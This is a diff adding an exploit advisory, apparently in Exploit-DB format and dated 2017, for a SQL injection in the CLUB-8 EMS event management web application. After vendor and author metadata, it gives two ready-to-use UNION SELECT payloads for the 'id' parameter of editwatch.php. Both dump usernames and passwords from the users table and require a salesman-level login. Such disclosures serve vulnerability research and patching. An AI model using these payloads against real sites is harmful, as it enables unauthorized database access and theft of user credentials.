@@ -1,0 +1,22 @@
+# # # # # 
+# Exploit Title: CLUB-8 EMS - Event Management System - SQL Injection
+# Google Dork: N/A
+# Date: 10.02.2017
+# Vendor Homepage: http://rexbd.net/
+# Software Buy: https://codecanyon.net/item/club8-ems-event-management-system-a-to-z/14067759
+# Demo: http://ems.rexbd.net/
+# Version: N/A
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# Login as sales man user
+# http://localhost/[PATH]/editwatch.php?id=[SQL]
+-999'+/*!50000union*/+select+group_concat(username,char(58),password),0x496873616e2053656e63616e,0x7777772e696873616e2e6e6574,4,5,6,7,8,9,10,11,12,13,14+from+users-- -
+#
+# http://localhost/[PATH]/editwatch.php?id=[SQL]
+-999'+/*!50000union*/+select+1,group_concat(username,char(58),password)+from+users-- -
+# # # # #
